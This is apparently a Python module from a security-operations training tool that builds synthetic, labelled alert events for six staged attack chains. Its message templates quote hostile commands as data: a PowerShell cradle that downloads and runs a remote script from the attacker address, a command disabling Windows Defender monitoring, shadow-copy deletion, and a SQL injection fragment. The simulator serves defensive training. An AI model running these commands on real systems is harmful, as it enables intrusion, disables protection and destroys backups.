"""
SentinelSOC Realistic Threat Simulation Engine
Generates structured, multi-step simulated security telemetry and realistic attack chains.
All events are strictly synthetic and labeled simulation: true.
"""
import random
import uuid
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from app.models.schemas import SecurityEvent
from app.services.mitre_service import map_event_to_mitre

# Internal simulated network infrastructure targets
TARGET_ASSETS = [
    {"target": "auth-gateway.corp.internal", "ip": "10.0.1.10", "port": 22, "proto": "SSH"},
    {"target": "dmz-web-portal.corp.internal", "ip": "10.0.1.20", "port": 443, "proto": "HTTPS"},
    {"target": "db-production-01.internal", "ip": "10.0.2.50", "port": 5432, "proto": "PostgreSQL"},
    {"target": "ad-domain-controller.corp", "ip": "10.0.1.5", "port": 389, "proto": "LDAP/Kerberos"},
    {"target": "finance-nas-storage.corp", "ip": "10.0.3.100", "port": 445, "proto": "SMB"},
    {"target": "api-gateway-edge.corp.internal", "ip": "10.0.1.15", "port": 8080, "proto": "HTTP"},
    {"target": "admin-rdp-jumpbox.corp", "ip": "10.0.1.33", "port": 3389, "proto": "RDP"},
]

# Clearly private/synthetic attacker source profiles
ATTACKER_SOURCES = [
    {"ip": "192.168.1.105", "label": "Simulated External Attacker Alpha"},
    {"ip": "10.0.4.15", "label": "Simulated Compromised Workstation B"},
    {"ip": "172.16.8.42", "label": "Simulated Rogue Device Gamma"},
    {"ip": "192.168.100.88", "label": "Simulated Threat Actor Delta"},
    {"ip": "10.12.0.77", "label": "Simulated Lateral Movement Pivot"},
]

# Attack Chain Scenarios
SCENARIOS = [
    {
        "id": "scenario_credential_brute_force",
        "name": "Credential Access: Password Spray & Brute Force Chain",
        "steps": [
            {
                "event_type": "LOGIN_FAILURE",
                "severity": "LOW",
                "message_template": "Failed authentication attempt for user 'root' from {src_ip} via SSH",
                "proto": "SSH", "port": 22
            },
            {
                "event_type": "LOGIN_FAILURE",
                "severity": "MEDIUM",
                "message_template": "Password spraying detected across multiple service accounts (administrator, svc_backup, deploy) from {src_ip}",
                "proto": "SSH", "port": 22
            },
            {
                "event_type": "BRUTE_FORCE",
                "severity": "CRITICAL",
                "message_template": "SSH credential brute-force threshold exceeded (>60 attempts/min) from {src_ip} targeting {target}",
                "proto": "SSH", "port": 22
            },
            {
                "event_type": "SUSPICIOUS_LOGIN",
                "severity": "HIGH",
                "message_template": "Successful authentication for valid account 'svc_backup' following brute-force attempts from {src_ip}",
                "proto": "SSH", "port": 22
            },
            {
                "event_type": "POWERSHELL_EXECUTION",
                "severity": "HIGH",
                "message_template": "Remote interactive shell executed: powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBFAFgA...",
                "proto": "SSH", "port": 22
            },
            {
                "event_type": "C2_COMMUNICATION",
                "severity": "CRITICAL",
                "message_template": "Outbound HTTP C2 beaconing detected from {target} to drop listener host {src_ip} over port 8080",
                "proto": "HTTP", "port": 8080
            }
        ]
    },
    {
        "id": "scenario_web_cve_exploitation",
        "name": "Initial Access: Web Vulnerability Exploit (CVE-2023-34362)",
        "steps": [
            {
                "event_type": "PORT_SCAN",
                "severity": "LOW",
                "message_template": "TCP SYN port scan detected targeting ports 80, 443, 8080 from {src_ip}",
                "proto": "TCP", "port": 80
            },
            {
                "event_type": "VULNERABILITY_SCAN",
                "severity": "MEDIUM",
                "message_template": "Automated web application vulnerability scan probing URI paths (/api, /admin, /moveitisapi/moveitisapi.dll) from {src_ip}",
                "proto": "HTTPS", "port": 443
            },
            {
                "event_type": "SQL_INJECTION",
                "severity": "HIGH",
                "message_template": "SQL injection payload detected in HTTP parameter 'id=UNION+SELECT' targeting {target}",
                "proto": "HTTPS", "port": 443
            },
            {
                "event_type": "EXPLOIT_ATTEMPT",
                "severity": "CRITICAL",
                "message_template": "Remote Code Execution exploit payload matching CVE-2023-34362 executed on {target}",
                "proto": "HTTPS", "port": 443
            },
            {
                "event_type": "MALWARE_ALERT",
                "severity": "CRITICAL",
                "message_template": "Web shell file dropped in /var/www/uploads/sys_check.php and executed via web server worker process",
                "proto": "HTTPS", "port": 443
            },
            {
                "event_type": "PRIVILEGE_ESCALATION",
                "severity": "CRITICAL",
                "message_template": "Local privilege escalation exploit executed via CVE-2024-3400 root escalation vector on {target}",
                "proto": "HTTPS", "port": 443
            }
        ]
    },
    {
        "id": "scenario_reconnaissance_port_scan",
        "name": "Reconnaissance: Network Service Discovery & Vulnerability Scan",
        "steps": [
            {
                "event_type": "PORT_SCAN",
                "severity": "LOW",
                "message_template": "High-velocity TCP SYN sweep detected across internal subnet from {src_ip} probing ports 21, 22, 80, 443, 445, 3389",
                "proto": "TCP", "port": 445
            },
            {
                "event_type": "SERVICE_ENUMERATION",
                "severity": "MEDIUM",
                "message_template": "Active service banner grabbing and RPC enumeration targeting {target} from {src_ip}",
                "proto": "TCP", "port": 135
            },
            {
                "event_type": "VULNERABILITY_SCAN",
                "severity": "HIGH",
                "message_template": "Unauthenticated vulnerability probe verifying unpatched SSL/TLS ciphers and exposed endpoints on {target}",
                "proto": "HTTPS", "port": 443
            }
        ]
    },
    {
        "id": "scenario_powershell_privilege_escalation",
        "name": "Execution & Defense Evasion: PowerShell Injection & Privilege Escalation",
        "steps": [
            {
                "event_type": "POWERSHELL_EXECUTION",
                "severity": "HIGH",
                "message_template": "Obfuscated PowerShell download cradle invoked: IEX (New-Object Net.WebClient).DownloadString('http://{src_ip}:8080/stage2.ps1')",
                "proto": "HTTP", "port": 8080
            },
            {
                "event_type": "DEFENSE_EVASION",
                "severity": "CRITICAL",
                "message_template": "Security control tampering: Set-MpPreference -DisableRealtimeMonitoring $true executed on {target}",
                "proto": "RPC", "port": 445
            },
            {
                "event_type": "PROCESS_INJECTION",
                "severity": "CRITICAL",
                "message_template": "Process memory injection into svchost.exe (PID: 1044) using VirtualAllocEx and WriteProcessMemory",
                "proto": "LOCAL", "port": 0
            },
            {
                "event_type": "PRIVILEGE_ESCALATION",
                "severity": "CRITICAL",
                "message_template": "Token elevation: Primary process security token elevated to NT AUTHORITY\\SYSTEM on {target}",
                "proto": "LOCAL", "port": 0
            }
        ]
    },
    {
        "id": "scenario_ransomware_execution",
        "name": "Impact: Lateral Movement & Ransomware Deployment",
        "steps": [
            {
                "event_type": "SUSPICIOUS_LOGIN",
                "severity": "HIGH",
                "message_template": "Off-hours RDP logon with privileged domain administrator account from unusual source {src_ip}",
                "proto": "RDP", "port": 3389
            },
            {
                "event_type": "LATERAL_MOVEMENT",
                "severity": "HIGH",
                "message_template": "Administrative SMB network share access and remote service creation on {target} from {src_ip}",
                "proto": "SMB", "port": 445
            },
            {
                "event_type": "SHADOW_COPY_DELETION",
                "severity": "CRITICAL",
                "message_template": "Inhibit system recovery command executed: vssadmin.exe Delete Shadows /All /Quiet on {target}",
                "proto": "RPC", "port": 445
            },
            {
                "event_type": "RANSOMWARE_ACTIVITY",
                "severity": "CRITICAL",
                "message_template": "High-velocity file modification and AES encryption pattern detected across storage volume {target}",
                "proto": "SMB", "port": 445
            }
        ]
    },
    {
        "id": "scenario_data_exfiltration",
        "name": "Exfiltration: Database Compromise & Outbound Dump",
        "steps": [
            {
                "event_type": "LOGIN_FAILURE",
                "severity": "LOW",
                "message_template": "Database authentication failure for user 'postgres' from non-whitelisted IP {src_ip}",
                "proto": "PostgreSQL", "port": 5432
            },
            {
                "event_type": "SUSPICIOUS_LOGIN",
                "severity": "HIGH",
                "message_template": "Direct PostgreSQL administrative session opened from untrusted staging subnet {src_ip}",
                "proto": "PostgreSQL", "port": 5432
            },
            {
                "event_type": "DATA_STAGING",
                "severity": "HIGH",
                "message_template": "Mass database dump: COPY INTO executed on customer records and staging archive /tmp/db_dump.7z",
                "proto": "PostgreSQL", "port": 5432
            },
            {
                "event_type": "DATA_EXFILTRATION",
                "severity": "CRITICAL",
                "message_template": "High-volume unauthorized outbound transfer: 5.4 GB staged data exfiltrated via HTTPS POST to {src_ip}",
                "proto": "HTTPS", "port": 443
            }
        ]
    }
]


class SimulationEngine:
    """Manages stateful scenario progression and individual event generation."""

    def __init__(self):
        self._active_scenario_index = 0
        self._active_step_index = 0
        self._current_src = random.choice(ATTACKER_SOURCES)
        self._current_target = random.choice(TARGET_ASSETS)
        self._event_counter = 1000

    def generate_next_event(self) -> SecurityEvent:
        """Generate the next correlated event in the active attack chain, or pick a new chain."""
        scenario = SCENARIOS[self._active_scenario_index]
        steps = scenario["steps"]

        step = steps[self._active_step_index]
        self._event_counter += 1
        event_id = f"SIM-{self._event_counter}"

        src_ip = self._current_src["ip"]
        target_asset = self._current_target["target"]
        dest_ip = self._current_target["ip"]
        proto = step.get("proto", self._current_target["proto"])
        port = step.get("port", self._current_target["port"])

        msg = step["message_template"].format(src_ip=src_ip, target=target_asset)
        mitre_info = map_event_to_mitre(step["event_type"])

        event = SecurityEvent(
            event_id=event_id,
            id=event_id,
            timestamp=datetime.now(timezone.utc).isoformat(),
            event_type=step["event_type"],
            type=step["event_type"],
            severity=step["severity"],
            source_ip=src_ip,
            destination_ip=dest_ip,
            destination_port=port,
            protocol=proto,
            target=target_asset,
            message=msg,
            simulation=True,
            source="SIMULATION",
            mitre_technique=mitre_info,
            scenario_id=scenario["id"],
            metadata={
                "scenario_name": scenario["name"],
                "step_index": self._active_step_index + 1,
                "total_steps": len(steps),
                "attacker_label": self._current_src["label"]
            }
        )

        # Advance step or switch scenario
        self._active_step_index += 1
        if self._active_step_index >= len(steps):
            self._active_step_index = 0
            self._active_scenario_index = (self._active_scenario_index + 1) % len(SCENARIOS)
            self._current_src = random.choice(ATTACKER_SOURCES)
            self._current_target = random.choice(TARGET_ASSETS)

        return event

    def trigger_scenario(self, scenario_id: str) -> Optional[List[SecurityEvent]]:
        """Trigger an entire attack scenario sequence on demand."""
        target_scen = next((s for s in SCENARIOS if s["id"] == scenario_id), None)
        if not target_scen:
            return None

        src = random.choice(ATTACKER_SOURCES)
        tgt = random.choice(TARGET_ASSETS)
        events = []

        for idx, step in enumerate(target_scen["steps"]):
            self._event_counter += 1
            eid = f"SIM-{self._event_counter}"
            mitre_info = map_event_to_mitre(step["event_type"])
            msg = step["message_template"].format(src_ip=src["ip"], target=tgt["target"])

            ev = SecurityEvent(
                event_id=eid,
                id=eid,
                timestamp=datetime.now(timezone.utc).isoformat(),
                event_type=step["event_type"],
                type=step["event_type"],
                severity=step["severity"],
                source_ip=src["ip"],
                destination_ip=tgt["ip"],
                destination_port=step.get("port", tgt["port"]),
                protocol=step.get("proto", tgt["proto"]),
                target=tgt["target"],
                message=msg,
                simulation=True,
                source="SIMULATION",
                mitre_technique=mitre_info,
                scenario_id=target_scen["id"],
                metadata={
                    "scenario_name": target_scen["name"],
                    "step_index": idx + 1,
                    "total_steps": len(target_scen["steps"]),
                    "attacker_label": src["label"]
                }
            )
            events.append(ev)

        return events


# Global singleton instance
simulation_engine = SimulationEngine()
